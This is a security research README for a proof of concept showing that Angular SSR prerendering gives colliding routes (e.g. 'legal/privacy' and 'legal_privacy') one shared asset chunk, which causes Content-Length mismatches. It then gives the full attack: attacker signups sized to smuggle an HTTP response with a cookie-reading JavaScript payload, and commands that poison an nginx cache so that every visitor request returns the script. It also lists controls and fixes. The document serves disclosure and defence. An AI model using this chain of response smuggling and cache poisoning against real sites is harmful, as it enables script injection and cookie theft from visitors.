# ng-chunk-collition

Two prerendered pages get the same server asset chunk, and the URL of the one that is lost then serves the other page's bytes under its own `Content-Length` and `ETag`.

An `ng new --ssr` app on published `@angular/build` and `@angular/ssr` 22.2.7, Node 24, with `angular.json` and `server.ts` as generated.

`/:user` is a profile, `/:user/:project` a project. Both are prerendered from `store.mjs` with the workaround from [GHSA-w34w-96hf-98hj](https://github.com/angular/angular-cli/security/advisories/GHSA-w34w-96hf-98hj):

```ts
const SLUG = /^[a-zA-Z0-9-_]+$/;

getPrerenderParams: async () => {
  const projects = await list<Project>('projects');
  return projects
    .filter((item) => SLUG.test(item.user) && SLUG.test(item.name))
    .map((item) => ({ user: item.user, project: item.name }));
},
```

The site also has two pages of its own, `/` and `/legal/privacy`. `store.mjs` is the signup API: it rejects names outside that allowlist, longer than 39 characters, reserved (`legal`, `api`, `admin`, ...) or already taken ignoring case, so `legal/privacy`, `legal` and `ALICE` are all refused. Records live in memory.

## The collision, no proxy

```sh
npm ci
node store.mjs &

post() { curl -s -H 'Content-Type: application/json' -d "$2" "http://127.0.0.1:4400/$1"; echo; }
post users    '{"name":"legal_privacy","bio":"Our privacy policy has moved.","website":"https://legal-privacy.example.test/"}'
post users    '{"name":"acme","bio":"Not the documentation team.","website":"https://other.example.test/"}'
post projects '{"user":"acme","name":"docs_intro","description":"A project of the account acme, which is not acme_docs. It has its own description, longer than the one it replaces."}'

taskset -c 0,1 npx ng build        # 2 CPUs: one prerender worker, no race
node tools/check-dist.mjs          # which pages share a chunk
node tools/probe.mjs               # every page requested once
NG_ALLOWED_HOSTS=localhost node dist/ng-chunk-collition/server/server.mjs
```

The store accepts all three records. The names only become equal inside the build's `replace`:

```text
legal/privacy/index.html    legal_privacy/index.html     ->  assets-chunks/legal_privacy_index_html.mjs
acme_docs/intro/index.html  acme/docs_intro/index.html   ->  assets-chunks/acme_docs_intro_index_html.mjs
```

```text
$ taskset -c 0,1 npx ng build                                   exit 0, no warning
Prerendered 15 static routes.

$ node tools/check-dist.mjs
SHARED ./assets-chunks/legal_privacy_index_html.mjs
  legal/privacy/index.html           declares 2647, chunk holds 1375
  legal_privacy/index.html           declares 1375, chunk holds 1375
SHARED ./assets-chunks/acme_docs_intro_index_html.mjs
  acme_docs/intro/index.html         declares 1281, chunk holds 1459
  acme/docs_intro/index.html         declares 1459, chunk holds 1459
17 pages, 15 chunks, 2 shared

$ node tools/probe.mjs
GET /acme/docs_intro       200  declared  1459  sent  1459  etag of this page  "Project acme/docs_intro"
GET /acme_docs/intro       200  declared  1281  sent  1459  etag of this page  "Project acme/docs_intro"   <-- not the declared length
GET /legal/privacy         200  declared  2647  sent  1375  etag of this page  "Profile of legal_privacy"   <-- not the declared length
GET /legal_privacy         200  declared  1375  sent  1375  etag of this page  "Profile of legal_privacy"

$ curl -s -D- http://localhost:4000/legal/privacy               stalls 6.06 s, then curl: (18)
content-length: 2647
etag: "85d6085a71e5686e"
<title>Profile of legal_privacy</title>
<h1>legal_privacy</h1><p>Our privacy policy has moved.</p><a href="https://legal-privacy.example.test/">Website</a>
```

Control: the same store without those three records builds `14 pages, 14 chunks, 0 shared`.

**Which page stays** is decided by the build machine, not by the content. With 2 CPUs there is one prerender worker and nothing races: 10 of 10 builds lost `legal/privacy` and `acme_docs/intro`, the pages that existed first, which is also what a default hosted CI runner gives. On 14 CPUs with a site this small it races: 8 builds lost `legal/privacy` in 5 and `legal_privacy` in 3. Every build lost two pages and none said so.

**No external data needed.** Two routes a developer could write collide the same way in a fresh `ng new --ssr`:

```ts
export const routes: Routes = [
  { path: 'blog/archive', component: Archive, title: 'Archive' },
  { path: 'blog_archive', component: LegacyArchive, title: 'Legacy archive' },
];
```

```text
Prerendered 2 static routes.                                    exit 0, no warning
assets-chunks/  blog_archive_index_html.mjs  index_csr_html.mjs  index_server_html.mjs

GET /blog/archive   200  content-length: 22107  <title>Legacy archive</title>
```

## Behind a proxy: what the attacker does

When the page that survives is the longer one, the server writes more bytes than it declared. A proxy with upstream keep-alive reads `Content-Length`, calls the response finished, and leaves the rest on the pooled connection, where it answers whichever request gets that connection next.

Those leftover bytes are the surviving page, which belongs to the attacker, so the attacker writes them. `tools/attacker.mjs` does it in two steps:

- `signup` creates two accounts with one project each, `mallory_dev/tools` and `mallory/dev_tools`. Both map to `mallory_dev_tools_index_html.mjs`, so one is lost.
- `fit` reads both pages from outside, then puts a complete HTTP response in the surviving project's description and sizes the lost one's description so that its declared length ends exactly where that response starts. Both are plain text through the signup API. The sizes take effect at the next build.

The response it writes:

```http
HTTP/1.1 200 OK
Content-Type: text/javascript
Content-Length: 130

globalThis.mallory='script of mallory, running in '+location.origin+', cookie: '+document.cookie;document.title=globalThis.mallory
```

An attempt is two requests in one TCP segment: the lost page, then the URL to replace. nginx answers them in order and gives the second one the connection it just freed, while the rest of the page is still arriving.

Two things have to be right. The link needs a round trip, because the leftover bytes must arrive after nginx has handed the connection over. If they land while it still sits idle in the pool, nginx sees them there and closes it: 0 % with netem removed (two containers on one host), 73.3 % at 300 µs, 100 % at 1 ms and above. And the declared length has to end where the server's first write burst ends, 13,032 bytes (9 × 1448 on a 1500-byte MTU); the lengths swept around it landed 0 %. That is one length per pair, not per build, and each pair gets its own chunk, so the attacker signs up one pair per length worth trying (`WHO=nico` is the second pair) and one of them lands.

With `proxy_cache` in front it is stored under the URL that next request asked for, and there is nothing left to race:

```sh
cd docker
lab() { docker compose run --rm --no-deps client node "$@"; }
build() { docker compose up -d store app proxy && docker compose run --rm --no-deps build; }

docker compose up -d store
lab tools/attacker.mjs signup
build                                            # CI with 2 CPUs
docker compose run --rm link                     # 300 us on the server's interface

lab tools/attacker.mjs fit
build                                            # the sizes take effect here
docker compose up -d --force-recreate app
docker compose run --rm link
lab tools/attacker.mjs check                     # is the pair in place?

PROXY=cache docker compose up -d --force-recreate proxy
lab tools/attacker.mjs poison                    # one attempt per URL, into an empty cache
lab tools/traffic.mjs 8 0 10                     # visitors, nobody attacking
```

```text
$ lab tools/attacker.mjs poison
/                                 1 attempts  X-Cache HIT     text/javascript   the script
/legal/privacy                    1 attempts  X-Cache HIT     text/javascript   the script
/alice                            1 attempts  X-Cache HIT     text/javascript   the script
/alice/notes                      1 attempts  X-Cache HIT     text/javascript   the script
/main-F225PFOB.js                 1 attempts  X-Cache HIT     text/javascript   the script

$ lab tools/traffic.mjs 8 0 10
visitor requests            47335
  got what they asked for   0
  got the attacker's script 47335  (100.0 %)
  answered from the cache   47335
attacker requests           0
```

An attempt that misses stores the real page instead, so it is one try per URL per `proxy_cache_valid` period (10 min here), and after a deployment the cache holds none of those URLs yet. A second run took 4 of the 5 URLs, 80.0 %.

The last URL is the site's own bundle, which every page loads in a `<script>`. A browser running it from the cache is the one step not tested here.

Without the cache, keep-alive alone still delivers the bytes, but only to the single request that follows: `lab tools/traffic.mjs 8 4 20` gets 0.4 to 4.6 % of visitor requests while the attacker keeps sending.

**Use `build` as written.** `store`, `app` and `client` share one image, so after a rebuild anything that starts the store recreates it and the in-memory records are gone. A bare `docker compose run build` does that a second before `ng build` reads the store, and the build comes out `14 pages, 14 chunks, 0 shared`, exit 0, which looks exactly like the control. Run `signup` again to put the records back.

## Controls

- `PROXY=bare`: nginx with only `proxy_pass`, HTTP/1.0 upstream. Nothing lands.
- `SERVER=docker/strict.mjs docker compose up -d --force-recreate app`: `response.strictContentLength = true` before the Angular handler. Nothing lands: 0 of 30 attempts, 0 of 7,361 visitor requests. The affected URLs are still the wrong page, just empty. Check `docker inspect chunk-lab-app-1 --format '{{.Config.Cmd}}'` first; an inline variable may not reach compose and the app then starts on the default command. Locally, `STRICT=1 node tools/probe.mjs`.
- `LAB_FIX=1` on `build`: a hash in the chunk name (`docker/unique-chunk-names.mjs`). Builds `17 pages, 17 chunks, 0 shared` and every URL serves its own page.
- `node tools/fuzz.mjs rtt|size|cache` from the repo root: the sweeps above, one line per cell. `pool`, `load` and `chain` are the no-cache ones.

Measured 2026-11-15 and 16: `@angular/build` and `@angular/ssr` 22.2.7, `@angular/core` 22.2.6, Node 24.20.0 on Linux 6.18, nginx 1.30.6, Chrome 156.0.8078.79.
